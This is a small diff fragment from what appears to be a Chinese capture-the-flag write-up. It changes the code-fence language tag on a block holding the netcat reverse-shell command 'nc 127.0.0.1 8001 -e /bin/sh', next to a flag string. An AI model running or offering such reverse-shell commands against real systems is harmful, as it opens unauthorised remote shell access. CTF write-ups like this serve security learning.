@@ -160,7 +160,7 @@ CTF{shell_code_base64_bypass}
 
 题目构造命令
 
-```JavaScript
+```
 nc 127.0.0.1 8001 -e /bin/sh
 ```
 
